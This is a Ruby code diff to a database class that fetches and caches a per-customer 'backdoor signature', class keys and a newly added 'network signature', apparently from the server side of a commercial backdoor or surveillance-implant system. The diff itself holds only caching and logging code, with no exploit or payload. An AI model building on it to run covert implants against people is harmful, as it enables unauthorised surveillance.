@@ -30,6 +30,7 @@ class DB
   UNKNOWN_BACKDOOR = 5
   
   attr_reader :backdoor_signature
+  attr_reader :network_signature
 
   def initialize
     # database address
@@ -47,6 +48,9 @@ class DB
 
     # global (per customer) backdoor signature
     @backdoor_signature = nil
+    # signature for the network elements
+    @network_signature = nil
+    # class keys
     @class_keys = {}
     
     # the current db layer to be used is the XML-RPC protocol
@@ -106,15 +110,19 @@ class DB
     # if the db is available, clear the cache and populate it again
     if @available then
       # get the global signature (per customer) for all the backdoors
-      sig = db_call :backdoor_signature
-      @backdoor_signature = Digest::MD5.digest sig unless sig.nil? 
-      
+      bck_sig = db_call :backdoor_signature
+      @backdoor_signature = Digest::MD5.digest bck_sig unless bck_sig.nil?
+
+      # get the network signature to communicate with the network elements
+      net_sig = db_call :network_signature
+      @network_signature = net_sig unless net_sig.nil?
+
       # get the classkey of every backdoor
       keys = db_call :class_keys
       @class_keys = keys unless keys.nil?
 
       # errors while retrieving the data from the db
-      return false if sig.nil? or keys.nil?
+      return false if bck_sig.nil? or keys.nil? or net_sig.nil?
 
       trace :info, "Emptying the DB cache..."
       # empty the cache and populate it again
@@ -122,8 +130,10 @@ class DB
 
       trace :info, "Populating the DB cache..."
       # save in the permanent cache
-      DBCache.signature = sig
+      DBCache.backdoor_signature = bck_sig
       trace :info, "Backdoor signature saved in the DB cache"
+      DBCache.network_signature = net_sig
+      trace :info, "Network signature saved in the DB cache"
       DBCache.add_class_keys @class_keys
       trace :info, "#{@class_keys.length} entries saved in the the DB cache"
 
@@ -136,7 +146,8 @@ class DB
       trace :info, "Loading the DB cache..."
 
       # populate the memory cache from the permanent one
-      @backdoor_signature = Digest::MD5.digest DBCache.signature unless DBCache.signature.nil?
+      @backdoor_signature = Digest::MD5.digest DBCache.backdoor_signature unless DBCache.backdoor_signature.nil?
+      @network_signature = DBCache.network_signature unless DBCache.network_signature.nil?
       @class_keys = DBCache.class_keys
 
       trace :info, "#{@class_keys.length} entries loaded from DB cache"
